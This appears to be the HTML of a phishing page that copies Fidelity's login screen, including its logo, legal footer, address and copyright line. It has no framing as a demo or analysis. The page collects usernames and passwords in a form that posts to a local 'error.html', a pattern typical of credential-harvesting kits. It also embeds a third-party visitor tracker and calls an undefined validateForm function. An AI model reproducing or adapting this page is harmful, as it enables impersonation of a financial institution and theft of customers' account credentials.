<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in to Fidelity </title>
  <style>
    /* Define the font using @font-face */
    @font-face {
      font-family: 'MacromediaFontographer';
      src: url('/fonts/MacromediaFontographer.woff') format('woff');
    }

    /* Apply the font globally */
    body {
      font-family: 'MacromediaFontographer', Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f9f9f9;
    }

    .top-section {
      background-color: #fff;
      padding: 10px 20px;
      border-bottom: 1px solid #ddd;
    }

    .top-section .logo {
      display: flex;
      align-items: center;
    }

    .top-section .logo img {
      max-height: 40px;
      height: auto;
    }

    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 5px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }

    h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #333;
      text-align: left; /* Align text to the left */
      font-weight: bold; /* Make the text bold */
    }

    .form-group {
      margin-bottom: 15px;
    }

    /* Make the labels bold */
    .form-group label {
      display: block;
      margin-bottom: 5px;
      color: #333;
      font-weight: bold; /* Make the labels bold */
    }

    .form-group input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    .form-group input:focus {
      border-color: #007bff;
      outline: none;
    }

    .error {
      color: red;
      font-size: 12px;
      margin-top: 5px;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }

    .checkbox-group input {
      margin-right: 5px;
    }

    .btn {
      width: 100%;
      padding: 10px;
      background: #218838; /* Dark Green color */
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }

    .btn:hover {
      background: #1c7430; /* Darker Green on hover */
    }

    .links {
      text-align: left;
      margin-top: 10px;
    }

    .links a {
      color: black; /* Set link color to black */
      text-decoration: underline;
      font-weight: bold;
    }

    footer {
      margin-top: 20px;
      padding: 20px;
      font-size: 12px; /* Small font size */
      line-height: 1.6; /* Spaced text */
      text-align: left; /* Align footer text to the left */
      color: #333; /* Gray color for text */
    }

    footer a {
      text-decoration: underline;
      color: black; /* Footer link color */
      font-weight: bold; /* Bold links */
    }

    .new-to-fidelity {
      font-size: 14px; /* Smaller font size */
      color: black; /* Set text color to black */
      font-weight: bold; /* Make text bold */
      margin-top: 20px; /* Add space above */
      text-align: center; /* Center the text */
    }
  </style>
</head>
<body>
  <!-- Top Section with Logo -->
  <div class="top-section">
    <div class="logo">
      <img src="Logo.png" alt="Fidelity Logo">
    </div>
  </div>
  
  <div class="container">
    <h1>Log in</h1>
    <form id="login-form" action="error.html" method="POST" onsubmit="return validateForm()">
      <div class="form-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <div class="checkbox-group">
        <input type="checkbox" id="remember" name="remember">
        <label for="remember">Remember my username</label>
      </div>
      <button type="submit" class="btn">Log in</button>
    </form>
    <div class="links">
      <a href="#">Forgot username or password?</a>
    </div>
  </div>
  
  <!-- Footer -->
  <footer>
    <div class="new-to-fidelity">
      New to Fidelity? <a href="#">Open an account</a> or <a href="#">sign up</a>.
    </div>
  
    <br><br>
    <p>
      National Financial Services LLC Statement of Financial Condition<br>
      Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. Fidelity supports 128-bit browser encryption.<br>
      Before investing, consider the funds' investment objectives, risks, charges, and expenses. Contact Fidelity for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.<br>
      Fidelity Brokerage Services LLC, Member NYSE, SIPC. 900 Salem Street, Smithfield, RI 02917
    </p>
    <p>
      ©1998-2025 FMR LLC. All Rights Reserved.<br>
      1159659.1.0
    </p>
  </footer>
<!-- Begin Web-Stat code v 7.0 -->
<span id="wts2192617"></span>
<script>var wts=document.createElement('script');wts.async=true;
wts.src='https://app.ardalio.com/log7.js';document.head.appendChild(wts);
wts.onload = function(){ wtslog7(2192617,1); };
</script><noscript><a href="https://www.web-stat.com">
<img src="https://app.ardalio.com/7/1/2192617.png" 
alt="Web-Stat traffic analytics"></a></noscript>
<!-- End Web-Stat code v 7.0 -->
  
</body>
</html>
